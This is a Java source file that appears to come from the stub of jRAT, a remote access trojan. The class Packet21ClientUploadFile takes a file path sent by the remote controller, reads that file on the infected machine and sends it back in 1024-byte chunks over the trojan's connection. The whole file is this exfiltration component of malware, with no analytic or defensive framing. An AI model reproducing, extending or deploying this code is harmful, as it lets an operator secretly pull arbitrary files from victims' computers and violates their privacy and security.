package se.jrat.stub.packets.incoming;

import java.io.File;
import java.io.FileInputStream;

import se.jrat.common.io.FileIO;
import se.jrat.stub.Connection;
import se.jrat.stub.Main;
import se.jrat.stub.packets.outgoing.Packet29ClientUploadPart;


public class Packet21ClientUploadFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		File file = new File(Connection.readLine());

		if (file.exists() && file.isFile()) {
			FileInputStream fileInput = new FileInputStream(file);
			byte[] chunk = new byte[1024];

			for (long pos = 0; pos < file.length(); pos += 1024) {
				int read = fileInput.read(chunk);
				
				Connection.addToSendQueue(new Packet29ClientUploadPart(file, chunk, read));
			}
			fileInput.close();
		}
	}

}
